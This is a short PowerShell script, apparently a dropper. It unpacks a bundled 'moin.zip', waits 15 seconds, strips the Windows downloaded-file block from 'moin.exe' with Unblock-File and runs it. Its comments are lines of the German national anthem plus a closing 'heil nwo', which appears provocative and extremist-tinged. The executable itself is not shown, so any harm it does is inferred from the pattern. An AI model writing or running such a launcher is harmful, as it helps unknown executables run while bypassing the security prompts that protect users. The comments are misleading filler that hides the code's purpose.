# Einigkeit und Recht und Freiheit
$zipPath = Join-Path -Path $PSScriptRoot -ChildPath "moin.zip"

# für das deutsche Vaterland
$destinationPath = $PSScriptRoot

# Danach lasst uns alle streben
$exePath = Join-Path -Path $destinationPath -ChildPath "moin.exe"

# brüderlich mit Herz und Hand
Expand-Archive -Path $zipPath -DestinationPath $destinationPath

# Einigkeit und Recht und Freiheit
Start-Sleep -Seconds 15

# sind des Glückes Unterpfand
Unblock-File -Path $exePath

# heil nwo
Start-Process -FilePath $exePath
